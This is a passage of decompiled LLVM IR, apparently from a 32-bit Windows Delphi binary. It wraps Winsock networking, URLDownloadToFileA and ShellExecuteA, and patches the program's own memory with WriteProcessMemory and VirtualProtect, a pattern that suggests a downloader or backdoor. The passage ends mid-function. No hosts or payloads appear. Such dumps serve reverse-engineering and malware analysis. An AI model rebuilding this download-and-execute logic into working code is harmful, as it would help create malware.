  store i32 %21, i32* %51, align 4, !insn.addr !395
  %52 = add i32 %esp.17.reload, -32, !insn.addr !396
  %53 = inttoptr i32 %52 to i32*, !insn.addr !396
  store i32 4, i32* %53, align 4, !insn.addr !396
  %54 = add i32 %esp.17.reload, -36, !insn.addr !397
  %55 = inttoptr i32 %54 to i32*, !insn.addr !397
  store i32 %22, i32* %55, align 4, !insn.addr !397
  %56 = add i32 %esp.17.reload, -40, !insn.addr !398
  %57 = inttoptr i32 %56 to i32*, !insn.addr !398
  store i32 %storemerge6.reload, i32* %57, align 4, !insn.addr !398
  %58 = call i32* @GetCurrentProcess(), !insn.addr !399
  %59 = ptrtoint i32* %58 to i32, !insn.addr !399
  %60 = add i32 %esp.17.reload, -44, !insn.addr !400
  %61 = inttoptr i32 %60 to i32*, !insn.addr !400
  store i32 %59, i32* %61, align 4, !insn.addr !400
  %62 = call i1 @WriteProcessMemory(i32* nonnull @0, i32* nonnull @0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !401
  %63 = add i32 %esp.17.reload, -48, !insn.addr !402
  %64 = inttoptr i32 %63 to i32*, !insn.addr !402
  store i32 %21, i32* %64, align 4, !insn.addr !402
  %65 = load i32, i32* %stack_var_-20, align 4, !insn.addr !403
  %66 = add i32 %esp.17.reload, -52, !insn.addr !404
  %67 = inttoptr i32 %66 to i32*, !insn.addr !404
  store i32 %65, i32* %67, align 4, !insn.addr !404
  %68 = add i32 %esp.17.reload, -56, !insn.addr !405
  %69 = inttoptr i32 %68 to i32*, !insn.addr !405
  store i32 4, i32* %69, align 4, !insn.addr !405
  %70 = add i32 %esp.17.reload, -60, !insn.addr !406
  %71 = inttoptr i32 %70 to i32*, !insn.addr !406
  store i32 %storemerge6.reload, i32* %71, align 4, !insn.addr !406
  %72 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !407
  store i32 %70, i32* %esp.0.reg2mem, !insn.addr !408
  br label %dec_label_pc_40498f, !insn.addr !408

dec_label_pc_404986:                              ; preds = %dec_label_pc_404946
  %73 = add i32 %storemerge6.reload, 4, !insn.addr !409
  %74 = inttoptr i32 %73 to i32*, !insn.addr !385
  %75 = load i32, i32* %74, align 4, !insn.addr !385
  %76 = icmp eq i32 %75, 0, !insn.addr !386
  %77 = icmp eq i1 %76, false, !insn.addr !387
  store i32 %75, i32* %.reg2mem14, !insn.addr !387
  store i32 %73, i32* %storemerge6.reg2mem, !insn.addr !387
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !387
  br i1 %77, label %dec_label_pc_404946, label %dec_label_pc_40498f, !insn.addr !387

dec_label_pc_40498f:                              ; preds = %dec_label_pc_404986, %dec_label_pc_40493e, %dec_label_pc_40494b, %dec_label_pc_40492b
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %78 = add i32 %esi.08.reload, 20, !insn.addr !410
  %79 = add i32 %esi.08.reload, 32, !insn.addr !373
  %80 = inttoptr i32 %79 to i32*, !insn.addr !373
  %81 = load i32, i32* %80, align 4, !insn.addr !373
  %82 = icmp eq i32 %81, 0, !insn.addr !374
  %83 = icmp eq i1 %82, false, !insn.addr !375
  store i32 %81, i32* %.reg2mem, !insn.addr !375
  store i32 %78, i32* %esi.08.reg2mem, !insn.addr !375
  store i32 %esp.0.reload, i32* %esp.17.reg2mem, !insn.addr !375
  store i32 %81, i32* %eax.0.reg2mem, !insn.addr !375
  br i1 %83, label %dec_label_pc_40492b, label %dec_label_pc_404999, !insn.addr !375

dec_label_pc_404999:                              ; preds = %dec_label_pc_40498f, %dec_label_pc_404992.preheader, %dec_label_pc_404912, %dec_label_pc_4048ec
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !411
}

define i32 @function_4049a4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4049a4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, 24, !insn.addr !412
  %2 = inttoptr i32 %1 to i32*, !insn.addr !412
  %3 = load i32, i32* %2, align 4, !insn.addr !412
  ret i32 %3, !insn.addr !413
}

define i32 @function_4049a8() local_unnamed_addr {
dec_label_pc_4049a8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !414
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !414
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !414
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !415
  %2 = load i32, i32* @global_var_409688, align 4, !insn.addr !416
  %3 = add i32 %2, 1, !insn.addr !416
  store i32 %3, i32* @global_var_409688, align 4, !insn.addr !416
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !417
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !418
  ret i32 0, !insn.addr !419
}

define i32 @function_4049cd() local_unnamed_addr {
dec_label_pc_4049cd:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !420
  ret i32 %0, !insn.addr !420
}

define i32 @function_4049d2() local_unnamed_addr {
dec_label_pc_4049d2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !421
}

define i32 @function_4049d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_4049d4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !422
}

define i32 @function_4049d8() local_unnamed_addr {
dec_label_pc_4049d8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409688, align 4, !insn.addr !423
  %2 = add i32 %1, -1, !insn.addr !423
  store i32 %2, i32* @global_var_409688, align 4, !insn.addr !423
  ret i32 %0, !insn.addr !424
}

define i32* @function_4049e0(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd) local_unnamed_addr {
dec_label_pc_4049e0:
  %0 = call i32* @ShellExecuteA(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd), !insn.addr !425
  ret i32* %0, !insn.addr !425
}

define i32 @function_4049e8() local_unnamed_addr {
dec_label_pc_4049e8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !426
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !426
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !426
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !427
  %2 = load i32, i32* @global_var_40968c, align 4, !insn.addr !428
  %3 = add i32 %2, 1, !insn.addr !428
  store i32 %3, i32* @global_var_40968c, align 4, !insn.addr !428
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !429
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !430
  ret i32 0, !insn.addr !431
}

define i32 @function_404a0d() local_unnamed_addr {
dec_label_pc_404a0d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !432
  ret i32 %0, !insn.addr !432
}

define i32 @function_404a12() local_unnamed_addr {
dec_label_pc_404a12:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !433
}

define i32 @function_404a14(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a14:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !434
}

define i32 @function_404a18() local_unnamed_addr {
dec_label_pc_404a18:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40968c, align 4, !insn.addr !435
  %2 = add i32 %1, -1, !insn.addr !435
  store i32 %2, i32* @global_var_40968c, align 4, !insn.addr !435
  ret i32 %0, !insn.addr !436
}

define i32 @function_404a20(i32 %s) local_unnamed_addr {
dec_label_pc_404a20:
  %0 = call i32 @closesocket(i32 %s), !insn.addr !437
  ret i32 %0, !insn.addr !437
}

define i32 @function_404a28(i32 %s, %sockaddr* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_404a28:
  %0 = call i32 @connect(i32 %s, %sockaddr* %name, i32 %namelen), !insn.addr !438
  ret i32 %0, !insn.addr !438
}

define i16 @function_404a30(i16 %hostshort) local_unnamed_addr {
dec_label_pc_404a30:
  %0 = call i16 @htons(i16 %hostshort), !insn.addr !439
  ret i16 %0, !insn.addr !439
}

define i8* @function_404a38(%in_addr %in) local_unnamed_addr {
dec_label_pc_404a38:
  %0 = call i8* @inet_ntoa(%in_addr %in), !insn.addr !440
  ret i8* %0, !insn.addr !440
}

define i32 @function_404a40(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_404a40:
  %0 = call i32 @recv(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !441
  ret i32 %0, !insn.addr !441
}

define i32 @function_404a48(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_404a48:
  %0 = call i32 @send(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !442
  ret i32 %0, !insn.addr !442
}

define i32 @function_404a50(i32 %af, i32 %type, i32 %protocol) local_unnamed_addr {
dec_label_pc_404a50:
  %0 = call i32 @socket(i32 %af, i32 %type, i32 %protocol), !insn.addr !443
  ret i32 %0, !insn.addr !443
}

define %hostent* @function_404a58(i8* %name) local_unnamed_addr {
dec_label_pc_404a58:
  %0 = call %hostent* @gethostbyname(i8* %name), !insn.addr !444
  ret %hostent* %0, !insn.addr !444
}

define i32 @function_404a60(i8* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_404a60:
  %0 = call i32 @gethostname(i8* %name, i32 %namelen), !insn.addr !445
  ret i32 %0, !insn.addr !445
}

define i32 @function_404a68(i16 %wVersionRequested, %WSAData* %lpWSAData) local_unnamed_addr {
dec_label_pc_404a68:
  %0 = call i32 @WSAStartup(i16 %wVersionRequested, %WSAData* %lpWSAData), !insn.addr !446
  ret i32 %0, !insn.addr !446
}

define i32 @function_404a70() local_unnamed_addr {
dec_label_pc_404a70:
  %0 = call i32 @WSACleanup(), !insn.addr !447
  ret i32 %0, !insn.addr !447
}

define i32 @function_404a78() local_unnamed_addr {
dec_label_pc_404a78:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !448
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !448
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !448
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !449
  %2 = load i32, i32* @global_var_409690, align 4, !insn.addr !450
  %3 = add i32 %2, 1, !insn.addr !450
  store i32 %3, i32* @global_var_409690, align 4, !insn.addr !450
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !451
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !452
  ret i32 0, !insn.addr !453
}

define i32 @function_404a9d() local_unnamed_addr {
dec_label_pc_404a9d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !454
  ret i32 %0, !insn.addr !454
}

define i32 @function_404aa2() local_unnamed_addr {
dec_label_pc_404aa2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !455
}

define i32 @function_404aa4(i32 %arg1) local_unnamed_addr {
dec_label_pc_404aa4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !456
}

define i32 @function_404aa8() local_unnamed_addr {
dec_label_pc_404aa8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409690, align 4, !insn.addr !457
  %2 = add i32 %1, -1, !insn.addr !457
  store i32 %2, i32* @global_var_409690, align 4, !insn.addr !457
  ret i32 %0, !insn.addr !458
}

define i32 @function_404c48() local_unnamed_addr {
dec_label_pc_404c48:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !459
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !459
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !459
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !460
  %2 = load i32, i32* @global_var_409694, align 4, !insn.addr !461
  %3 = add i32 %2, 1, !insn.addr !461
  store i32 %3, i32* @global_var_409694, align 4, !insn.addr !461
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !462
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !463
  ret i32 0, !insn.addr !464
}

define i32 @function_404c6d() local_unnamed_addr {
dec_label_pc_404c6d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !465
  ret i32 %0, !insn.addr !465
}

define i32 @function_404c72() local_unnamed_addr {
dec_label_pc_404c72:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !466
}

define i32 @function_404c74(i32 %arg1) local_unnamed_addr {
dec_label_pc_404c74:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !467
}

define i32 @function_404c78() local_unnamed_addr {
dec_label_pc_404c78:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409694, align 4, !insn.addr !468
  %2 = add i32 %1, -1, !insn.addr !468
  store i32 %2, i32* @global_var_409694, align 4, !insn.addr !468
  ret i32 %0, !insn.addr !469
}

define i32 @function_404c80() local_unnamed_addr {
dec_label_pc_404c80:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !470
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !470
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !470
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !471
  %2 = load i32, i32* @global_var_409698, align 4, !insn.addr !472
  %3 = add i32 %2, 1, !insn.addr !472
  store i32 %3, i32* @global_var_409698, align 4, !insn.addr !472
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !473
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !474
  ret i32 0, !insn.addr !475
}

define i32 @function_404ca5() local_unnamed_addr {
dec_label_pc_404ca5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !476
  ret i32 %0, !insn.addr !476
}

define i32 @function_404caa() local_unnamed_addr {
dec_label_pc_404caa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !477
}

define i32 @function_404cac(i32 %arg1) local_unnamed_addr {
dec_label_pc_404cac:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !478
}

define i32 @function_404cb0() local_unnamed_addr {
dec_label_pc_404cb0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409698, align 4, !insn.addr !479
  %2 = add i32 %1, -1, !insn.addr !479
  store i32 %2, i32* @global_var_409698, align 4, !insn.addr !479
  ret i32 %0, !insn.addr !480
}

define i32 @function_404cb8() local_unnamed_addr {
dec_label_pc_404cb8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !481
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !481
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !481
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !482
  %2 = load i32, i32* @global_var_40969c, align 4, !insn.addr !483
  %3 = add i32 %2, 1, !insn.addr !483
  store i32 %3, i32* @global_var_40969c, align 4, !insn.addr !483
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !484
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !485
  ret i32 0, !insn.addr !486
}

define i32 @function_404cdd() local_unnamed_addr {
dec_label_pc_404cdd:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !487
  ret i32 %0, !insn.addr !487
}

define i32 @function_404ce2() local_unnamed_addr {
dec_label_pc_404ce2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !488
}

define i32 @function_404ce4(i32 %arg1) local_unnamed_addr {
dec_label_pc_404ce4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !489
}

define i32 @function_404ce8() local_unnamed_addr {
dec_label_pc_404ce8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40969c, align 4, !insn.addr !490
  %2 = add i32 %1, -1, !insn.addr !490
  store i32 %2, i32* @global_var_40969c, align 4, !insn.addr !490
  ret i32 %0, !insn.addr !491
}

define i32 @function_404cf0() local_unnamed_addr {
dec_label_pc_404cf0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !492
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !492
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !492
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !493
  %2 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !494
  %3 = add i32 %2, 1, !insn.addr !494
  store i32 %3, i32* @global_var_4096a0, align 4, !insn.addr !494
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !495
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !496
  ret i32 0, !insn.addr !497
}

define i32 @function_404d15() local_unnamed_addr {
dec_label_pc_404d15:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !498
  ret i32 %0, !insn.addr !498
}

define i32 @function_404d1a() local_unnamed_addr {
dec_label_pc_404d1a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !499
}

define i32 @function_404d1c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404d1c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !500
}

define i32 @function_404d20() local_unnamed_addr {
dec_label_pc_404d20:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !501
  %2 = add i32 %1, -1, !insn.addr !501
  store i32 %2, i32* @global_var_4096a0, align 4, !insn.addr !501
  ret i32 %0, !insn.addr !502
}

define i32 @function_404d28(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5) local_unnamed_addr {
dec_label_pc_404d28:
  %0 = call i32 @URLDownloadToFileA(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5), !insn.addr !503
  ret i32 %0, !insn.addr !503
}

define i32 @function_404d30() local_unnamed_addr {
dec_label_pc_404d30:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !504
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !504
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !504
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !505
  %2 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !506
  %3 = add i32 %2, 1, !insn.addr !506
  store i32 %3, i32* @global_var_4096a4, align 4, !insn.addr !506
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !507
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !508
  ret i32 0, !insn.addr !509
}

define i32 @function_404d55() local_unnamed_addr {
dec_label_pc_404d55:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !510
  ret i32 %0, !insn.addr !510
}

define i32 @function_404d5a() local_unnamed_addr {
dec_label_pc_404d5a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !511
}

define i32 @function_404d5c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404d5c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !512
}

define i32 @function_404d60() local_unnamed_addr {
dec_label_pc_404d60:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !513
  %2 = add i32 %1, -1, !insn.addr !513
  store i32 %2, i32* @global_var_4096a4, align 4, !insn.addr !513
  ret i32 %0, !insn.addr !514
}

define i32 @function_404d68() local_unnamed_addr {
dec_label_pc_404d68:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !515
  %2 = icmp ult i8 %1, 10
  %3 = and i32 %0, 255
  br i1 %2, label %dec_label_pc_404d6c, label %dec_label_pc_404d75, !insn.addr !516

dec_label_pc_404d6c:                              ; preds = %dec_label_pc_404d68
  %4 = add nuw nsw i32 %3, 48, !insn.addr !517
  ret i32 %4, !insn.addr !518

dec_label_pc_404d75:                              ; preds = %dec_label_pc_404d68
  %5 = add nuw nsw i32 %3, 55, !insn.addr !519
  ret i32 %5, !insn.addr !520
}

define i32 @function_404d80() local_unnamed_addr {
dec_label_pc_404d80:
  %esp.2.reg2mem = alloca i32, !insn.addr !521
  %esp.1.reg2mem = alloca i32, !insn.addr !521
  %cf.0.reg2mem = alloca i1, !insn.addr !521
  %esi.0.reg2mem = alloca i32, !insn.addr !521
  %esp.0.reg2mem = alloca i32, !insn.addr !521
  %ebx.0.reg2mem = alloca i32, !insn.addr !521
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !522
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !523
  store i32 %2, i32* %stack_var_-52, align 4, !insn.addr !523
  %3 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !523
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !524
  %4 = call i32 @"@LStrClr"(), !insn.addr !525
  %5 = call i32 @function_4034c8(), !insn.addr !526
  %6 = icmp slt i32 %5, 1
  store i32 %3, i32* %esp.2.reg2mem, !insn.addr !527
  br i1 %6, label %dec_label_pc_404e81, label %dec_label_pc_404dcd.preheader, !insn.addr !527

dec_label_pc_404dcd.preheader:                    ; preds = %dec_label_pc_404d80
  %7 = add i32 %0, -1, !insn.addr !528
  store i32 1, i32* %ebx.0.reg2mem
  store i32 %3, i32* %esp.0.reg2mem
  store i32 %5, i32* %esi.0.reg2mem
  br label %dec_label_pc_404dcd

dec_label_pc_404dcd:                              ; preds = %dec_label_pc_404dcd.preheader, %dec_label_pc_404e79
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %7, %ebx.0.reload, !insn.addr !528
  %9 = inttoptr i32 %8 to i8*, !insn.addr !528
  %10 = load i8, i8* %9, align 1, !insn.addr !528
  %11 = icmp eq i8 %10, 32, !insn.addr !528
  %12 = icmp eq i1 %11, false, !insn.addr !529
  br i1 %12, label %dec_label_pc_404de8, label %dec_label_pc_404dd7, !insn.addr !529

dec_label_pc_404dd7:                              ; preds = %dec_label_pc_404dcd
  %13 = call i32 @"@LStrCat"(), !insn.addr !530
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !531
  br label %dec_label_pc_404e79, !insn.addr !531

dec_label_pc_404de8:                              ; preds = %dec_label_pc_404dcd
  %14 = icmp ult i8 %10, 32, !insn.addr !532
  br i1 %14, label %dec_label_pc_404e0b, label %dec_label_pc_404df2, !insn.addr !533

dec_label_pc_404df2:                              ; preds = %dec_label_pc_404de8
  %15 = add i8 %10, -32, !insn.addr !534
  %16 = icmp ult i8 %15, 95, !insn.addr !535
  %17 = icmp ult i8 %15, 96
  store i1 %16, i1* %cf.0.reg2mem, !insn.addr !536
  br i1 %17, label %dec_label_pc_404dff, label %dec_label_pc_404e09, !insn.addr !536

dec_label_pc_404dff:                              ; preds = %dec_label_pc_404df2
  %18 = load i32, i32* inttoptr (i32 4214464 to i32*), align 64, !insn.addr !537
  %19 = and i8 %15, 31
  %20 = zext i8 %19 to i32, !insn.addr !537
  %21 = shl i32 1, %20, !insn.addr !537
  %22 = and i32 %18, %21, !insn.addr !537
  %23 = icmp ne i32 %22, 0, !insn.addr !537
  store i1 %23, i1* %cf.0.reg2mem, !insn.addr !537
  br label %dec_label_pc_404e09, !insn.addr !537

dec_label_pc_404e09:                              ; preds = %dec_label_pc_404df2, %dec_label_pc_404dff
  %cf.0.reload = load i1, i1* %cf.0.reg2mem
  %24 = icmp eq i1 %cf.0.reload, false, !insn.addr !538
  br i1 %24, label %dec_label_pc_404e60, label %dec_label_pc_404e0b, !insn.addr !538

dec_label_pc_404e0b:                              ; preds = %dec_label_pc_404e09, %dec_label_pc_404de8
  %25 = and i8 %10, 15
  %26 = zext i8 %25 to i32, !insn.addr !539
  %27 = add i32 %esp.0.reload, -4, !insn.addr !540
  %28 = inttoptr i32 %27 to i32*, !insn.addr !540
  store i32 %26, i32* %28, align 4, !insn.addr !540
  %29 = add i32 %esp.0.reload, -8, !insn.addr !541
  %30 = inttoptr i32 %29 to i32*, !insn.addr !541
  store i32 ptrtoint (i32* @global_var_404ed4 to i32), i32* %30, align 4, !insn.addr !541
  %31 = call i32 @function_404d68(), !insn.addr !542
  %32 = call i32 @"@LStrFromChar"(), !insn.addr !543
  %33 = add i32 %esp.0.reload, -12, !insn.addr !544
  %34 = inttoptr i32 %33 to i32*, !insn.addr !544
  store i32 0, i32* %34, align 4, !insn.addr !544
  %35 = call i32 @function_404d68(), !insn.addr !545
  %36 = call i32 @"@LStrFromChar"(), !insn.addr !546
  %37 = add i32 %esp.0.reload, -16, !insn.addr !547
  %38 = inttoptr i32 %37 to i32*, !insn.addr !547
  store i32 0, i32* %38, align 4, !insn.addr !547
  %39 = call i32 @"@LStrCatN"(), !insn.addr !548
  store i32 %37, i32* %esp.1.reg2mem, !insn.addr !549
  br label %dec_label_pc_404e79, !insn.addr !549

dec_label_pc_404e60:                              ; preds = %dec_label_pc_404e09
  %40 = call i32 @"@LStrFromChar"(), !insn.addr !550
  %41 = call i32 @"@LStrCat"(), !insn.addr !551
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !551
  br label %dec_label_pc_404e79, !insn.addr !551

dec_label_pc_404e79:                              ; preds = %dec_label_pc_404e60, %dec_label_pc_404e0b, %dec_label_pc_404dd7
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %42 = add i32 %ebx.0.reload, 1, !insn.addr !552
  %43 = add i32 %esi.0.reload, -1, !insn.addr !553
  %44 = icmp eq i32 %43, 0, !insn.addr !553
  %45 = icmp eq i1 %44, false, !insn.addr !554
  store i32 %42, i32* %ebx.0.reg2mem, !insn.addr !554
  store i32 %esp.1.reload, i32* %esp.0.reg2mem, !insn.addr !554
  store i32 %43, i32* %esi.0.reg2mem, !insn.addr !554
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !554
  br i1 %45, label %dec_label_pc_404dcd, label %dec_label_pc_404e81, !insn.addr !554

dec_label_pc_404e81:                              ; preds = %dec_label_pc_404e79, %dec_label_pc_404d80
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %46 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !555
  %47 = load i32, i32* %46, align 4, !insn.addr !555
  call void @__writefsdword(i32 0, i32 %47), !insn.addr !556
  %48 = add i32 %esp.2.reload, 8, !insn.addr !557
  %49 = inttoptr i32 %48 to i32*, !insn.addr !557
  store i32 4214443, i32* %49, align 4, !insn.addr !557
  %50 = call i32 @"@LStrArrayClr"(), !insn.addr !558
  %51 = call i32 @"@LStrClr"(), !insn.addr !559
  ret i32 %51, !insn.addr !560
}

define i32 @function_404ea4() local_unnamed_addr {
dec_label_pc_404ea4:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !561
  ret i32 %0, !insn.addr !561
}

define i32 @function_404ea9() local_unnamed_addr {
dec_label_pc_404ea9:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !562
}

define i32 @function_404eab(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404eab:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !563
}

define i32 @function_404ecf() local_unnamed_addr {
dec_label_pc_404ecf:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !564
  %2 = inttoptr i32 %0 to i32*, !insn.addr !564
  store i32 %1, i32* %2, align 4, !insn.addr !564
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !565
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !565
  %7 = add i8 %4, %6, !insn.addr !565
  %8 = inttoptr i32 %5 to i8*, !insn.addr !565
  store i8 %7, i8* %8, align 1, !insn.addr !565
  %9 = load i8, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !566
  %10 = load i32, i32* %eax, align 4, !insn.addr !566
  %11 = udiv i32 %10, 256, !insn.addr !566
  %12 = trunc i32 %11 to i8, !insn.addr !566
  %13 = add i8 %9, %12, !insn.addr !566
  store i8 %13, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !566
  %14 = call i32 @function_4036b8(), !insn.addr !567
  %15 = call i32 @__readfsdword(i32 0), !insn.addr !568
  store i32 %15, i32* %stack_var_-24, align 4, !insn.addr !568
  %16 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !568
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !569
  %17 = call i32 @"@LStrCatN"(), !insn.addr !570
  %18 = call i32 @function_4036c8(), !insn.addr !571
  %19 = inttoptr i32 %18 to i32*, !insn.addr !572
  %20 = call i32 @URLDownloadToFileA(i32* %19, i8* null, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !572
  call void @__writefsdword(i32 0, i32 0), !insn.addr !573
